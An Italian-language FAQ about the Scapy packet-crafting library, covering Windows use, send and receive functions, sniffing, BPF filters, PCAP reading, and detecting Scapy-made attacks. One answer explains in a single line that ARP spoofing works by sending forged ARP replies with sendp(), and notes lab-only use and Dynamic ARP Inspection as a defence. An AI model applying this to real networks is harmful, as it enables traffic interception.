**Scapy funziona su Windows?** Sì, ma serve Npcap per catturare e inviare pacchetti. Alcune funzioni di livello 2 sono più limitate che su Linux.

**Come si usa Scapy in Python?** Importi la libreria con `from scapy.all import *`, costruisci un pacchetto unendo i protocolli con `/` e lo mandi con `send()`, `sr()` o `sr1()`.

**Qual è la differenza tra send, sendp, sr e sr1?** `send` e `sendp` mandano e basta (livello 3 e livello 2). `sr` e `sr1` mandano e aspettano la risposta (tutte o solo la prima). `srp` e `srp1` fanno lo stesso al livello 2.

**Come si fa uno sniffer di pacchetti con Scapy?** Con `sniff()`: indichi la scheda di rete (`iface`), un filtro BPF (`filter`) e una funzione da chiamare per ogni pacchetto (`prn`).

**Posso usare filtri BPF in Scapy?** Sì, con il parametro `filter`. Serve libpcap. Se non c'è, usa `lfilter`, che accetta una funzione Python.

**Come leggo un file PCAP con Scapy?** Con `rdpcap("file.pcap")` per caricarlo tutto, oppure con `PcapReader` per leggerlo un pacchetto alla volta.

**Scapy è lento?** Sì, rispetto a Nmap o masscan. È scritto in Python e costruisce ogni pacchetto da zero. Per scansioni grandi usa Nmap, per casi particolari usa Scapy.

**Scapy fa ARP spoofing?** Sì, mandando risposte ARP false con `sendp()`. Va fatto solo in laboratorio, e si previene con Dynamic ARP Inspection.

**Dov'è la documentazione di Scapy?** La documentazione ufficiale è su scapy.readthedocs.io. Dentro la shell, `ls()` e `lsc()` elencano protocolli e funzioni.

**Come mi accorgo di un attacco fatto con Scapy?** Dai segnali sulla rete, non dal programma: cambi di MAC per lo stesso IP, molti SYN in pochi secondi, flag TCP impossibili, frammenti strani. Un monitor ARP e un IDS li vedono.
